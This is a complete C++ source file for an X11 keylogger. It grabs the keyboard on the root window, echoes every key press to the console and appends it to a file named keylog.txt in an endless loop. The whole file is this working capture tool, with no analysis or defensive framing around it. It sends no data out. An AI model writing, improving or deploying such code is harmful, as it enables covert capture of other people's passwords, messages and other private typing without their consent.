#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/Xutil.h>
#include <iostream>
#include <fstream>
#include <unistd.h>

void logKey(const char *key)
{
    std::ofstream logfile;
    logfile.open("keylog.txt", std::ios_base::app);
    if (logfile.is_open())
    {
        logfile << key;
        logfile.close();
    }
}

int main()
{
    Display *display = XOpenDisplay(nullptr);
    if (display == nullptr)
    {
        std::cerr << "Cannot open display" << std::endl;
        return 1;
    }

    Window root = DefaultRootWindow(display);
    XEvent event;

    XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime);

    while (true)
    {
        XNextEvent(display, &event);
        if (event.type == KeyPress)
        {
            char buffer[128] = {0};
            KeySym keysym;
            XComposeStatus compose;
            XLookupString(&event.xkey, buffer, sizeof(buffer), &keysym, &compose);

            std::cout << "Key pressed: " << buffer << std::endl;
            logKey(buffer);
        }

        usleep(10000); // Sleep for 10 milliseconds
    }

    XCloseDisplay(display);
    return 0;
}